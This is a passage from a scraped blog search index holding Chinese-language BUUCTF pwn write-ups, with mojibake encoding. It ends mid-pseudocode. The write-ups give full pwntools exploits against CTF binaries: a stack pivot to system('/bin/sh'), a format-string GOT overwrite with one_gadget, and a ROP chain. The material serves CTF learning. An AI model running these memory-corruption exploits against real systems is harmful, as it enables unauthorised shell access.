sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x28 backdoor = m_elf.sym[\u0026#39;hack\u0026#39;] payload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; send_after_clean(payload, no_show=True) buf = recv_and_transform(\u0026#34;b\u0026#34;) - 0x38 leave_ret = 0x08048562 call_system = 0x8048559 payload = flat([ 0, call_system, buf + 4*3, \u0026#34;/bin/sh\\x00\u0026#34; ]).ljust(0x28, b\u0026#34;\\x00\u0026#34;) payload += flat([ buf, leave_ret ]) sendline_after_clean(payload, no_show=True) interactive_after_clean(no_show=True) å…¶ä¸­ï¼Œå› ä¸ºcallä¼šè‡ªåŠ¨å°†ä¸‹ä¸€æ¡æŒ‡ä»¤å…¥æ ˆï¼Œæ‰€ä»¥å°±ä¸ç”¨åœ¨æ ˆä¸­ç©ºå‡ºä¸€ä½ç»™retäº†ï¼Œbuf+4*3çš„ä½ç½®ä¼šè¢«è°ƒæ•´ä¸ºesp+8\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/call32%E6%A0%88%E8%BF%81%E7%A7%BBbuuctf-ciscn_2019_s_4/","section":"writeup","summary":"If you change the way you look at things, the things you look at change. â€” Wayne Dyer åŸé¢˜é“¾æ¥ æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  é™åˆ¶æº¢å‡ºçš„å­—ç¬¦åˆ°retåªèƒ½æœ‰ä¸€ä¸ªåœ°å€ï¼Œæ²¡æœ‰åé—¨å‡½æ•°ï¼Œå…¸å‹æ ˆè¿ç§» exp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn","tags":["pwn","32ä½ç³»ç»Ÿcall","æ ˆè¿ç§»"],"title":"ã€call32ã€‘ã€æ ˆè¿ç§»ã€‘BUUCTF ciscn_2019_s_4"},{"categories":["writeup"],"contents":" I have an everyday religion that works for me. Love yourself first, and everything else falls into line. â€” Lucille Ball\nã€Write-upã€‘BUUCTF others_shellcode åŸé¢˜é“¾æ¥\nã€Write-upã€‘BUUCTF others_shellcode checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»º exp checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file shell_asm [*] \u0026#39;/home/peterl/security/workspace/shell_asm/shell_asm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  ç„¶åæˆ‘ä»¬çœ‹åˆ°å®ƒçš„getShellå‡½æ•°ï¼š\næˆ‘ä»¬çœ‹åˆ°å®ƒé‡Œé¢æœ‰ä¸€å¥å¾ˆå¥‡æ€ªçš„__asm { int 80h; LINUX - sys_execve }ï¼Œè¿™æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ\næˆ‘ä»¬æŒ‰ tab çœ‹ä¸€ä¸‹å®ƒå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼š\nè¿™é‡Œæˆ‘ä»¬å·²ç»çœ‹å‡ºä¸€ç‚¹ç«¯å€ªäº†ï¼Œæ²¡é”™ï¼Œè¿™ä¸€å¥å°±æ˜¯å†…è”æ±‡ç¼–ï¼ˆå†…è”æ±‡ç¼–ä½¿ç”¨â€œ__asmâ€ï¼ˆC++ï¼‰å’Œâ€œasmâ€ï¼ˆC å’Œ C++ï¼‰å…³é”®å­—å£°æ˜ï¼‰\nå…·ä½“å¯ä»¥çœ‹ä»¥ä¸‹æ¨æ–‡ï¼š\nMIPS æŒ‡ä»¤é›†ï¼šå†…åµŒæ±‡ç¼– asm è¯­æ³•ä»‹ç» C è¯­è¨€å†…åµŒæ±‡ç¼–**asm__**volatile__ C è¯­è¨€ ASM æ±‡ç¼–å†…åµŒè¯­æ³• è‡³äºint 80çš„ä½œç”¨ï¼Œè¯·å‚è€ƒæˆ‘å†™çš„è¿™ç¯‡ writeupçš„ç¬¬äºŒä¸ª exp\næ„å»º exp è¿™é¢˜æ ¹æœ¬ä¸éœ€è¦ expï¼Œç›´æ¥nc ç½‘å€ ç«¯å£å·å³å¯ï¼Œç¨‹åºä¼šè‡ªåŠ¨æ‰§è¡Œexecve(\u0026quot;/bin/sh\u0026quot;, 0, 0)\nè¿™é¢˜çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯ä»‹ç»int 80çš„ä½œç”¨è¿˜æœ‰å†…è”æ±‡ç¼–\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/","section":"writeup","summary":"I have an everyday religion that works for me. Love yourself first, and everything else falls into line. â€” Lucille Ball ã€Write-upã€‘BUUCTF others_shellcode åŸé¢˜é“¾æ¥ ã€Write-upã€‘BUUCTF others_shellcode checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„","tags":["pwn","Cå†…åµŒæ±‡ç¼–"],"title":"ã€Cå†…åµŒæ±‡ç¼–ã€‘others_shellcode"},{"categories":["writeup"],"contents":" Love is blind; friendship closes its eyes. â€” Friedrich Nietzsche\næŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å…¸å‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬gdbåˆ°printf(format);é‚£é‡Œçœ‹ä¸‹æ ˆï¼š\nå¯ä»¥çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Šå‚¨å­˜è¦å…ˆåæ‰ä¸€ä¸ªå­—ç¬¦æ‰åˆ°ç¬¬8ä¸ªå‚æ•°çš„ä½ç½®\næˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°åœ¨ç¬¬0x97ä¸ªå‚æ•°çš„ä½ç½®å­˜å‚¨äº†__libc_start_main+247çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å…¶è®¡ç®—å‡ºlibcçš„åŸºå€\né‚£ä¹ˆç­”æ¡ˆå°±å¾ˆç®€å•äº†ï¼Œæ”¹å†™printfçš„gotå€¼ä¸ºsystemå³å¯\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./axb_2019_fmt32\u0026#34; libc_name:str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;25269\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... format_payload = b\u0026#34;%151$p\u0026#34; sendline_after_clean(format_payload) libcbase = recv_and_transform(\u0026#34;:\u0026#34;, False, False, \u0026#34;\\n\u0026#34;) - 247 - libc.sym[\u0026#39;__libc_start_main\u0026#39;] system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] binsh_addr = libcbase + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) one_gadget = libcbase + 0x3a80e suclog( libcbase=libcbase, system_addr=system_addr, binsh_addr=binsh_addr ) format_payload = b\u0026#34;a\u0026#34; + fmtstr_payload(8, {m_elf.got[\u0026#39;printf\u0026#39;]:one_gadget}, 10) sendline_after_clean(format_payload, no_show=False) sendline_after_clean(b\u0026#34;/bin/sh\u0026#34;) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/fmtstr_payload%E5%87%BD%E6%95%B0buuctf-axb_2019_fmt32/","section":"writeup","summary":"Love is blind; friendship closes its eyes. â€” Friedrich Nietzsche æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å…¸å‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬gdbåˆ°printf(format);é‚£é‡Œçœ‹ä¸‹æ ˆï¼š å¯ä»¥çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Šå‚¨","tags":["pwn","fmtstr_payloadå‡½æ•°","æ ¼å¼åŒ–å­—ç¬¦ä¸²"],"title":"ã€fmtstr_payloadå‡½æ•°ã€‘BUUCTF axb_2019_fmt32"},{"categories":["writeup"],"contents":" We respect our elders. There is wisdom that comes from experience, and I am not going to stop learning from wise counsel. â€” Marcia Fudge\nåŸé¢˜é“¾æ¥\nã€Write-upã€‘BUUCTF ã€HarekazeCTF2019ã€‘baby_rop checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  gdb è°ƒè¯• æ„å»º exp å®Œæ•´ exp checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file babyrop [*] \u0026#39;/home/peterl/security/workspace/babyrop/babyrop\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 ä½ç¨‹åºï¼Œä¸èƒ½ä½¿ç”¨ shellcode\nida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æœ‰ scanfï¼Œæœ‰ printfï¼Œçœ‹èµ·æ¥å¯èƒ½æ˜¯æ™®é€šçš„æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥è°ƒè¯•çœ‹çœ‹\næ­¤é¢˜ç”¨ä¸äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå› ä¸ºæˆ‘ä»¬æ§åˆ¶ä¸äº† format å­—ç¬¦ä¸²ï¼Œåªèƒ½æ§åˆ¶åé¢è·Ÿçš„ argsï¼Œè€Œ printf åªä¼šå¯¹ format å­—ç¬¦ä¸²ä½œè§£æ\ngdb è°ƒè¯• è¿™é¢˜æ¯”è¾ƒå‘çš„æ˜¯ç¬¬ä¸€æ¡è¾“å‡ºè¯­å¥æ˜¯systemå‡½æ•°è¾“å‡ºçš„ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ gdb è°ƒè¯•ä¹‹å‰å°±è¦åŠ ä¸€å¥set follow-fork-mode parentï¼Œè¿™æ¡å‘½ä»¤å°†è°ƒè¯•è¿½è¸ªå›ºå®šåœ¨çˆ¶ç¨‹åºä¸Šï¼Œä¸è®©ä»–è·‘å»è¿½è¸ªå­ç¨‹åº\næˆ‘ä»¬é€šè¿‡ ida æ‰¾åˆ°call _printfçš„åœ°å€ï¼Œä½¿ç”¨b* 0x40060Fæ‰“ä¸ªæ–­ç‚¹ï¼Œè¿™æ—¶å€™å¦‚æœç›´æ¥ run å°±éœ€è¦è¾“å…¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆcyclic 50ä¸€ä¸ªè§„å¾‹å­—ç¬¦ä¸²ç”¨ä»¥è¾“å…¥\npwndbg\u0026gt; cyclic 50 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama ç„¶åç›´æ¥r\nç„¶åæˆ‘ä»¬çœ‹åˆ°æ ˆæƒ…å†µæ˜¯è¿™æ ·çš„ï¼š\n00:0000â”‚ rsi rsp 0x7fffffffd770 â—‚â€” \u0026#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 01:0008â”‚ 0x7fffffffd778 â—‚â€” \u0026#39;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 02:0010â”‚ rbp 0x7fffffffd780 â—‚â€” \u0026#39;eaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 03:0018â”‚ 0x7fffffffd788 â—‚â€” \u0026#39;gaaahaaaiaaajaaakaaalaaama\u0026#39; 04:0020â”‚ 0x7fffffffd790 â—‚â€” \u0026#39;iaaajaaakaaalaaama\u0026#39; 05:0028â”‚ 0x7fffffffd798 â—‚â€” \u0026#39;kaaalaaama\u0026#39; 06:0030â”‚ 0x7fffffffd7a0 â—‚â€” 0x1ff00616d /* \u0026#39;ma\u0026#39; */ ä½œè€…æ­¤æ—¶å¿ƒä¸­ä¸€å–œï¼Œè¿æŒ‰nç»§ç»­åˆ°retæŒ‡ä»¤ï¼Œçœ‹ä¸€çœ‹æ­¤æ—¶rspæ ˆé¡¶æŒ‡é’ˆæŒ‡å‘å“ªé‡Œ\næˆ‘ä»¬å‘ç° return å€¼å¯ä»¥è¢«æˆ‘ä»¬æ ˆæº¢å‡ºæ‰ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨cyclic -l gaaaæ¥çœ‹ä¸€çœ‹åç§»é‡æ˜¯å¤šå°‘ï¼š\npwndbg\u0026gt; cyclic -l gaaa 24 åŒæ—¶å½“å‰ç¨‹åº plt è¡¨ä¸­è‚¯å®šæœ‰systemï¼ˆå‰é¢è°ƒç”¨è¿‡ï¼‰ï¼Œæˆ‘ä»¬åªéœ€è¦/bin/shæˆ–è€…shå°±èƒ½æ„å»º exp äº†ï¼\næ„å»º exp åœ¨ ida ä¸­æ‰¾åˆ°systemçš„åœ°å€ï¼š\nROPgadgetå¯»æ‰¾/bin/shï¼š\n$ ROPgadget --binary babyrop --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000601048 : /bin/sh ROPgadgetå¯»æ‰¾pop rdi;retå’Œretï¼š\n$ ROPgadget --binary babyrop --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400683 : pop rdi ; ret ... 0x0000000000400479 : ret ... é‚£ä¹ˆæˆ‘ä»¬çš„ payload å°±å‡ºæ¥äº†ï¼š\npop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) å®Œæ•´ exp from pwn import * from pwn import p64, p32, u32, u64 import pwnlib # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyrop\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28069\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x40060F\u0026#34;) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) pop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 p.recvuntil(\u0026#34;What\u0026#39;s your name? \u0026#34;) payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) p.sendline(payload) # p.recvuntil(\u0026#34;!\\n\u0026#34;) p.interactive() æ­¤é¢˜è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå‘çš„ç‚¹ï¼Œå®ƒçš„ flag å¹¶ä¸æ˜¯æ”¾åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œæ­¤é¢˜ flag çš„ä½ç½®åœ¨/home/babyropå†…ï¼Œå¯ä»¥é€šè¿‡find -name flagæŸ¥æ‰¾ä½ç½®ï¼ˆåŠ¨ä½œå¿«ä¸€ç‚¹ï¼Œæœ‰æ—¶é—´é™åˆ¶ï¼‰\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/harekazectf2019baby_rop/","section":"writeup","summary":"We respect our elders. There is wisdom that comes from experience, and I am not going to stop learning from wise counsel. â€” Marcia Fudge åŸé¢˜é“¾æ¥ ã€Write-upã€‘BUUCTF ã€HarekazeCTF2019ã€‘baby_rop checksec æŸ¥çœ‹ç¨‹åº","tags":["pwn"],"title":"ã€HarekazeCTF2019ã€‘baby_rop"},{"categories":["writeup"],"contents":" Do you want to know who you are? Don\u0026rsquo;t ask. Act! Action will delineate and define you. â€” Thomas Jefferson\nåŸé¢˜é“¾æ¥å’Œè¿™é“é¢˜æ˜¯ä¸€é“é¢˜ï¼Œä¸€æ¨¡ä¸€æ ·çš„\nã€Write-upã€‘BUUCTF ciscn_2019_en_2 checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»º exp å®Œæ•´ exp checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ciscn_2019_en_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_en_2/ciscn_2019_en_2\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 ä½ç¨‹åºï¼Œä¸èƒ½ç”¨ shellcode\nå†ç”¨readelfå‘½ä»¤çœ‹ä¸€ä¸‹ï¼š\n$ readelf -r ciscn_2019_en_2 é‡å®šä½èŠ‚ \u0026#39;.rela.dyn\u0026#39; at offset 0x538 contains 4 entries: åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° + åŠ æ•° 000000601ff8 000800000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000602080 000d00000005 R_X86_64_COPY 0000000000602080 stdout@GLIBC_2.2.5 + 0 000000602090 000e00000005 R_X86_64_COPY 0000000000602090 stdin@GLIBC_2.2.5 + 0 0000006020a0 000f00000005 R_X86_64_COPY 00000000006020a0 stderr@GLIBC_2.2.5 + 0 é‡å®šä½èŠ‚ \u0026#39;.rela.plt\u0026#39; at offset 0x598 contains 11 entries: åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° + åŠ æ•° 000000602018 000100000007 R_X86_64_JUMP_SLO 0000000000000000 _exit@GLIBC_2.2.5 + 0 000000602020 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 000000602028 000300000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0 000000602030 000400000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0 000000602038 000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000602040 000600000007 R_X86_64_JUMP_SLO 0000000000000000 getchar@GLIBC_2.2.5 + 0 000000602048 000700000007 R_X86_64_JUMP_SLO 0000000000000000 signal@GLIBC_2.2.5 + 0 000000602050 000900000007 R_X86_64_JUMP_SLO 0000000000000000 gets@GLIBC_2.2.5 + 0 000000602058 000a00000007 R_X86_64_JUMP_SLO 0000000000000000 fflush@GLIBC_2.2.5 + 0 000000602060 000b00000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0 000000602068 000c00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0 å‘ç°æ²¡æœ‰systemï¼Œå¯èƒ½å°±æ˜¯ ret2libc äº†\nida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-4h] BYREF init(argc, argv, envp); puts(\u0026#34;EEEEEEE hh iii \u0026#34;); puts(\u0026#34;EE mm mm mmmm aa aa cccc hh nn nnn eee \u0026#34;); puts(\u0026#34;EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e \u0026#34;); puts(\u0026#34;EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;====================================================================\u0026#34;); puts(\u0026#34;Welcome to this Encryption machine\\n\u0026#34;); begin(); while ( 1 ) { while ( 1 ) { fflush(0LL); v4 = 0; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); getchar(); if ( v4 != 2 ) break; puts(\u0026#34;I think you can do it by yourself\u0026#34;); begin(); } if ( v4 == 3 ) { puts(\u0026#34;Bye!\u0026#34;); return 0; } if ( v4 != 1 ) break; encrypt(); begin(); } puts(\u0026#34;Something Wrong!\u0026#34;); return 0; } è¿™ä¸€å¤§å †æ‚ä¹±çš„ä»£ç æˆ‘ä»¬èŠ±ä¸€ç‚¹æ—¶é—´å»åˆ†æå°±ä¼šå‘ç°ï¼Œåªæœ‰å½“ç¬¬ä¸€æ¬¡è¾“å…¥çš„é€‰é¡¹æ˜¯ 1 çš„æ—¶å€™ï¼Œæ‰ä¼šè¿›å…¥encryptå‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ä¼ª C ä»£ç ä¸ºï¼š\nint encrypt() { size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] BYREF __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(\u0026#34;Input your Plaintext to be encrypted\u0026#34;); gets(s); while ( 1 ) { v0 = (unsigned int)x; if ( v0 \u0026gt;= 